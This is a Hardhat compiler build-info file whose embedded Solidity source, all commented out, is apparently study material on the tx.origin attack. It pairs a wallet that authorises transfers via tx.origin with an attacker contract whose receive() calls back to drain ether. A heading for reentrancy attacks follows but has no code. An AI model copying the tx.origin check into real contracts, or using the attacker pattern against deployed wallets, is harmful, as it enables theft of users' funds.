{
	"id": "df8d94859d7d439c980f1c638957727d",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"Attact.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.7;\n\n/*\ntx.origin 攻击\n\n*/\n// contract TxUserWallet {\n//     event UserLog(uint256 gg);\n\n//     address owner;\n\n//     constructor() payable {\n//         owner = msg.sender;\n//     }\n\n//     function transferTo(address payable dest, uint amount) external payable{\n//         require(tx.origin == owner);\n//         emit UserLog(gasleft());\n//         // dest.transfer(amount);\n//         // dest.call{value: amount, gas: 2300}(\"\");\n//         // 以上两种情况会因为gas携带不够不能完全执行\n//         dest.call{value: amount}(\"\");\n//     }\n\n//     function getBalance() public view returns(uint) {\n//         uint _balance = address(this).balance;\n//         return _balance;\n//     }\n// }\n\n// interface InterfaceUserWallet {\n//     function transferTo(address payable dest, uint amount) external payable;\n// }\n\n// contract TxAttackWallet {\n//     event AttackLog(uint256 gg);\n\n//     address payable owner;\n\n//     constructor() payable {\n//         owner = payable(msg.sender);\n//     }\n\n//     receive() external payable {\n//         emit AttackLog(gasleft());\n//         InterfaceUserWallet(msg.sender).transferTo(payable(address(this)), 1 ether);\n//     }\n\n//     function getBalance() public view returns(uint) {\n//         uint _balance = address(this).balance;\n//         return _balance;\n//     }\n// }\n\n/*\n重入攻击\n*/\n\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"sources": {
			"Attact.sol": {
				"ast": {
					"absolutePath": "Attact.sol",
					"exportedSymbols": {},
					"id": 2,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"0.8",
								".7"
							],
							"nodeType": "PragmaDirective",
							"src": "32:22:0"
						}
					],
					"src": "32:1370:0"
				},
				"id": 0
			}
		}
	}
}